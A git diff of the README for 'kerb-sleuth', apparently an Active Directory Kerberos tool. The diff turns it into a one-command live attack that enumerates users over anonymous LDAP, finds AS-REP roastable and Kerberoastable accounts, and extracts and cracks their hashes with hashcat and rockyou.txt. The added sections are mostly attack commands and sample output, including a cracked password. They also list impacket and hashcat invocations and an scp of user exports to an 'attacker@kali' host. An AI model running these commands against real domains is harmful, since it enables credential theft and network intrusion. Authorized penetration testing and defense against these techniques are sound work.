@@ -113,64 +113,124 @@ docker-compose exec kerb-sleuth ./kerb-sleuth --help
 
 ---
 
-## ⚡ **QUICK START**
+## ⚡ **QUICK START** 
 
-### 1️⃣ **Export AD Data**
-```powershell
-# PowerShell - Export all users with properties
-Get-ADUser -Filter * -Properties * | Export-Csv users.csv -NoTypeInformation
+### 🎯 **LIVE TARGET HUNTING** (Primary Mode)
 
-# Alternative: LDIF export
-ldifde -f users.ldif -d "DC=corp,DC=local" -r "(objectClass=user)"
+**Just give it a target IP or hostname - KERB-SLEUTH does the rest!**
+
+```bash
+# 1️⃣ Basic hunt (anonymous connection)
+kerb-sleuth hunt --target 10.0.0.1
+
+# 2️⃣ Hunt with domain name  
+kerb-sleuth hunt --target dc01.corp.local
+
+# 3️⃣ Hunt with credentials (if anonymous fails)
+kerb-sleuth hunt --target 10.0.0.1 --user guest --pass ''
+
+# 4️⃣ Hunt with SSL and auto-cracking (requires authorization)
+kerb-sleuth hunt --target 10.0.0.1 --ssl --crack --i-am-authorized
 ```
 
-### 2️⃣ **Run Kerb-Sleuth**
-```bash
-# Basic scan
-./kerb-sleuth scan --ad users.csv --out results.json
+### 🔥 **WHAT HAPPENS AUTOMATICALLY:**
 
-# Advanced scan with all outputs
-./kerb-sleuth scan --ad users.csv --out results.json --csv --siem --crack --i-am-authorized
+1. **🔍 LDAP Connection** - Tries anonymous first, falls back to LDAPS if needed
+2. **👥 User Enumeration** - Pulls all AD users via live LDAP queries  
+3. **🎯 AS-REP Hunting** - Finds accounts with `DoesNotRequirePreAuth=True`
+4. **🎟️ Kerberoast Hunting** - Finds accounts with Service Principal Names (SPNs)
+5. **📊 Risk Scoring** - Intelligent scoring based on password age, group membership, etc.
+6. **💾 Results Export** - JSON, CSV, and SIEM-ready Sigma rules
+7. **🔓 Auto-Cracking** *(if `--crack` enabled)* - Extracts hashes and runs hashcat with rockyou.txt
+
+### 📋 **EXAMPLE OUTPUT:**
+```
+🩸 KERB-SLEUTH v1.0.0 - Kerberos Vulnerability Hunter 💀
+
+🔗 Attempting to connect to target: 10.0.0.1
+✅ Connected via Anonymous LDAP, Base DN: DC=corp,DC=local  
+🏢 Domain: CORP.LOCAL
+👥 Enumerated 1,337 users from target
+🎯 Found 3 AS-REP candidates
+🎟️ Found 12 Kerberoast candidates  
+📊 Results written to: results.json
+
+🔓 Starting hash extraction and cracking...
+📄 AS-REP hashes exported to: hashes/asrep_hashes.txt
+🔨 Starting AS-REP hash cracking with wordlist: /usr/share/wordlists/rockyou.txt  
+🎉 CRACKED PASSWORDS FOUND!
+backup_svc:Password123!
+
+✅ Hunt complete! High: 2 | Medium: 8 | Low: 5 risk targets
+🚨 2 HIGH RISK targets found! Check results.json for details
 ```
 
-### 3️⃣ **Analyze Results**
-```bash
-# View summary
-cat results.json | jq '.summary'
+---
 
-# High-risk targets only
-cat results.json | jq '.candidates[] | select(.score >= 80)'
+### 🗂️ **LEGACY FILE ANALYSIS** (Optional)
+
+If you already have exported AD files, you can analyze them offline:
+
+```bash
+# Analyze exported CSV/JSON/LDIF files
+kerb-sleuth analyze --ad users.csv --out results.json
+
+# Generate test data
+kerb-sleuth simulate --dataset small --out tests/sample_data/
 ```
 
 ---
 
 ## 🎮 **USAGE EXAMPLES**
 
-### 🔍 **Basic Operations**
+### 🎯 **Live Target Hunting** (Primary Mode)
 ```bash
-# Scan AD export
-kerb-sleuth scan --ad users.csv --out results.json
+# Anonymous hunting (tries LDAP port 389)
+kerb-sleuth hunt --target 192.168.1.10
+
+# Specific domain controller  
+kerb-sleuth --target dc01.corp.local
+
+# With authentication (if anonymous blocked)
+kerb-sleuth hunt --target 10.0.0.1 --user 'CORP\guest' --pass ''
+kerb-sleuth hunt --target 10.0.0.1 --user scanner --pass 'P@ssw0rd'
+
+# Secure connection (LDAPS port 636)
+kerb-sleuth hunt --target 10.0.0.1 --ssl
+
+# Full attack chain with auto-cracking
+kerb-sleuth hunt --target 10.0.0.1 --crack --i-am-authorized
+```
+
+### 🔓 **Advanced Hunting & Exploitation**
+```bash
+# Hunt with custom wordlist
+kerb-sleuth hunt --target 10.0.0.1 --crack --wordlist /opt/wordlists/custom.txt --i-am-authorized
+
+# Hunt with multiple outputs
+kerb-sleuth hunt --target 10.0.0.1 --csv --siem --crack --i-am-authorized
+
+# Custom configuration
+kerb-sleuth hunt --target 10.0.0.1 --config custom-weights.yml
+```
+
+### 📁 **File Analysis** (Legacy Mode)
+```bash
+# Analyze exported AD files
+kerb-sleuth analyze --ad users.csv --out results.json
+kerb-sleuth analyze --ad export.json --csv --siem
 
 # Generate test data
-kerb-sleuth simulate --dataset small --out tests/sample_data/
-
-# Multiple output formats
-kerb-sleuth scan --ad users.csv --csv --siem --out comprehensive_scan
+kerb-sleuth simulate --dataset large --out tests/sample_data/
 ```
 
-### 🔓 **Advanced Operations (Authorized Only)**
+### 🐳 **Docker Usage**
 ```bash
-# Hash export for cracking
-kerb-sleuth scan --ad users.csv --crack --wordlist rockyou.txt --i-am-authorized
+# Run in Docker container
+./run-docker.sh hunt --target 10.0.0.1
 
-# Live LDAP scan
-kerb-sleuth live-scan --ldap ldaps://dc.corp.local --bind-user scanner --bind-pass 'P@ssw0rd' --i-am-authorized
-```
-
-### ⚙️ **Custom Configuration**
-```bash
-# Custom scoring weights
-kerb-sleuth scan --ad users.csv --config custom-weights.yml --out targeted_results.json
+# Interactive shell
+./docker-shell.sh
 ```
 
 ---
@@ -345,6 +405,93 @@ make docker-run
 # 5. Push to GitHub: git push origin v1.0.0
 # 6. Create GitHub release with binaries
 ```
+
+---
+
+## 🔥 **HOW IT WORKS** 
+
+### **Step-by-Step Workflow:**
+
+1. **🎯 Give it a target:** `kerb-sleuth hunt --target 10.0.0.1`
+
+2. **🔍 Auto-Discovery:**
+   - Resolves hostname to IP
+   - Tries anonymous LDAP connection (port 389)
+   - Falls back to LDAPS (port 636) if needed
+   - Discovers domain name and base DN
+
+3. **👥 User Enumeration:**
+   - Pulls ALL Active Directory users via live LDAP
+   - Extracts user properties (UAC, SPNs, groups, etc.)
+
+4. **🎯 Vulnerability Detection:**
+   - **AS-REP Roasting:** Finds `DoesNotRequirePreAuth=True` accounts
+   - **Kerberoasting:** Finds accounts with Service Principal Names (SPNs)
+
+5. **📊 Risk Assessment:**
+   - Scores based on password age, group membership, account activity
+   - Prioritizes high-value targets (Domain Admins, service accounts, etc.)
+
+6. **💾 Results Export:**
+   - JSON for detailed analysis
+   - CSV for spreadsheet import  
+   - Sigma rules for SIEM integration
+
+7. **🔓 Auto-Exploitation** *(optional with `--crack`)*:
+   - Extracts AS-REP hashes (`hashcat -m 18200`)
+   - Extracts Kerberoast hashes (`hashcat -m 13100`) 
+   - Auto-cracks with `rockyou.txt` wordlist
+   - Shows cracked passwords immediately
+
+### **🎪 No Manual Steps Required!**
+- ❌ No need to export AD data manually
+- ❌ No need to run separate tools for hash extraction
+- ❌ No need to figure out hashcat modes
+- ✅ Just point it at a DC and let it hunt!
+
+---
+
+## 🆚 **OLD vs NEW WORKFLOW**
+
+### ❌ **Traditional Approach (Complex)**
+```bash
+# Step 1: Export AD data manually
+Get-ADUser -Filter * -Properties * | Export-Csv users.csv
+
+# Step 2: Copy file to attacker machine  
+scp users.csv attacker@kali:~/
+
+# Step 3: Analyze with multiple tools
+kerb-sleuth analyze --ad users.csv
+impacket-GetNPUsers domain.com/user -usersfile users.txt
+impacket-GetUserSPNs domain.com/user -request
+
+# Step 4: Extract hashes manually
+# Step 5: Run hashcat with correct modes
+hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 tgs.hashes /usr/share/wordlists/rockyou.txt
+```
+
+### ✅ **KERB-SLEUTH Approach (Simple)**
+```bash
+# One command does everything!
+kerb-sleuth hunt --target 10.0.0.1 --crack --i-am-authorized
+
+# That's it! 🎉
+# ✅ Enumerates users via live LDAP  
+# ✅ Finds AS-REP & Kerberoast targets
+# ✅ Extracts hashes automatically
+# ✅ Cracks with rockyou.txt
+# ✅ Shows results immediately
+```
+
+### 🚀 **Why KERB-SLEUTH is Better:**
+- **🎯 Point & Shoot:** Just give it a target IP/hostname
+- **🔄 Fully Automated:** No manual export or hash extraction steps  
+- **⚡ Real-time:** Works against live DCs, not just exported files
+- **🧠 Intelligent:** Auto-detects connection methods and domains
+- **🔓 Complete:** Finds vulnerabilities AND exploits them
+- **📊 Professional:** Clean outputs ready for reporting
 
 ---
 
